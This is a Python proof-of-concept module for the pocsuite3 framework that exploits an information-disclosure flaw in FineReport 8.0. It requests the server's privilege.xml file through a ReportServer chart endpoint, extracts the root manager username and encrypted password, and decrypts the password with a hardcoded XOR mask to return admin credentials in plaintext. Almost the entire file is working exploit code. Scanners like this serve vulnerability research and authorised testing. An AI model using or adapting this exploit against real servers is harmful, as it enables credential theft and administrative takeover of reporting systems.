"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

import re

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY


class DemoPOC(POCBase):
    vulID = '00004'
    version = '3.0'
    author = ['Bamboo']
    vulDate = '2019-07-17'
    createDate = '2019-07-27'
    updateDate = '2019-07-27'
    references = ['']
    name = 'FR 8.0'
    appPowerLink = ''
    appName = 'FR报表系统'
    appVersion = 'FR 8.0'
    vulType = 'sensitive information'
    desc = '''
        FR 大版本软件更新不会更新版本号，所以同样是8.0，也可能没有这个洞
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        veri_url = self.url + '/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml'

        try:
            resp = requests.get(veri_url)
            pattern1 = r"<rootManagerPassword>.*</rootManagerPassword>"
            patrern2 = r"<rootManagerName>.*</rootManagerName>"
            r2 = re.search(patrern2, str(resp.content))
            r1 = re.search(pattern1, str(resp.content))
            username = r2.group(0)[28:-21]
            cipher = r1.group(0)[32:-25]
            PASSWORD_MASK_ARRY = [19, 78, 10, 15, 100, 213, 43, 23];
            password = ""
            cipher = cipher[3:]
            for i in range(int(len(cipher) / 4)):
                p1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
                p2 = p1 ^ PASSWORD_MASK_ARRY[i % 8]
                password = password + chr(p2)
            if resp.status_code == 200 and password:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = veri_url
                result['AdminInfo'] = {}
                result['AdminInfo']["UserName"] = username
                result['AdminInfo']["Password"] = password
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
